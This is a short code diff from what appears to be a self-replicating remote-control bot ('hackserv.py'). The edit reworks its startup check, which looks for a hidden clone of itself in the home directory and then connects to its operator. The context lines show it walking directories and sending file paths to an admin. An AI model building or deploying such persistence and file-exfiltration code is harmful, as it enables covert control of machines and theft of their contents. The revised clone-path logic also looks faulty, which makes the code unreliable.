@@ -323,15 +323,14 @@ def fileList(dir): # List files in current directory
             sendntc(os.path.join(root, name), adminname)
 
 def srtChk(): # Startup Check. (Still in testing!)
-    name = str(sys.argv[0])
+    name = str(__name__)
     hd = str(os.path.expanduser('~'))
-    hdPath = hd + '/.arm0red'
+    hdPath = hd + str(os.getcwd())
     clone = hdPath + '/.hackserv.py'
     if name == clone:
         if debugmode: # If debugmode is True, msgs will print to screen.
             print(name + " and "+ clone + " are the same file!")
-            connect()
-            #print("Cloned bot is already running!")
+        connect()
     else:
         try:
             if debugmode: # If debugmode is True, msgs will print to screen.
